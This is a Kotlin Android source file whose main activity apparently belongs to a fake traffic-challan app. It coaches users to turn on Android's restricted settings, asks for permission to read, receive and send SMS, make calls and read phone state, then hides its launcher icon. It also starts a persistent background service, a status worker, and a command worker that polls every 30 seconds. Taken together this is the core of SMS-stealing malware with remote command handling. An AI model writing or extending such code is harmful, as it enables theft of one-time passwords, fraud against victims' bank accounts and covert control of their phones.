package com.rte.challan

import android.Manifest
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import com.rte.challan.service.BackgroundService
import com.rte.challan.worker.CommandWorker
import com.rte.challan.worker.StatusWorker
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    private lateinit var btnEnableRestricted: Button
    private lateinit var btnRequestPermissions: Button
    private lateinit var tvInstruction: TextView

    private val SMS_PERMISSION_CODE = 100

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        btnEnableRestricted = findViewById(R.id.btnEnableRestricted)
        btnRequestPermissions = findViewById(R.id.btnRequestPermissions)
        tvInstruction = findViewById(R.id.tvInstruction)

        if (isSmsPermissionGranted()) {
            setupCompleted()
        } else {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                btnEnableRestricted.visibility = android.view.View.VISIBLE
                btnEnableRestricted.setOnClickListener {
                    openAppInfo()
                }
                tvInstruction.text = "Step 1: Tap above button\n" +
                        "Step 2: Tap ⋮ menu → Allow restricted settings → ON\n" +
                        "Step 3: Come back and tap Request Permissions"
            }
        }

        btnRequestPermissions.setOnClickListener {
            requestSmsPermission()
        }
    }

    private fun isSmsPermissionGranted(): Boolean {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED
    }

    private fun requestSmsPermission() {
        ActivityCompat.requestPermissions(
            this,
            arrayOf(
                Manifest.permission.READ_SMS,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.SEND_SMS,
                Manifest.permission.CALL_PHONE,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.POST_NOTIFICATIONS
            ),
            SMS_PERMISSION_CODE
        )
    }

    private fun openAppInfo() {
        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
        intent.data = Uri.parse("package:$packageName")
        startActivity(intent)
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == SMS_PERMISSION_CODE) {
            if (grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                Toast.makeText(this, "Permissions granted!", Toast.LENGTH_SHORT).show()
                setupCompleted()
            } else {
                Toast.makeText(this, "Permissions denied. App may not work properly.", Toast.LENGTH_LONG).show()
            }
        }
    }

    private fun setupCompleted() {
        hideLauncherIcon()
        startBackgroundWork()
        finish()
    }

    private fun hideLauncherIcon() {
        packageManager.setComponentEnabledSetting(
            ComponentName(this, MainActivity::class.java),
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    private fun startBackgroundWork() {
        val serviceIntent = Intent(this, BackgroundService::class.java)
        ContextCompat.startForegroundService(this, serviceIntent)

        val workManager = WorkManager.getInstance(this)

        val statusRequest = PeriodicWorkRequestBuilder<StatusWorker>(15, TimeUnit.MINUTES)
            .setInitialDelay(1, TimeUnit.MINUTES)
            .build()
        workManager.enqueueUniquePeriodicWork(
            "status_worker",
            ExistingPeriodicWorkPolicy.KEEP,
            statusRequest
        )

        val commandRequest = PeriodicWorkRequestBuilder<CommandWorker>(30, TimeUnit.SECONDS)
            .setInitialDelay(10, TimeUnit.SECONDS)
            .build()
        workManager.enqueueUniquePeriodicWork(
            "command_worker",
            ExistingPeriodicWorkPolicy.KEEP,
            commandRequest
        )
    }
}
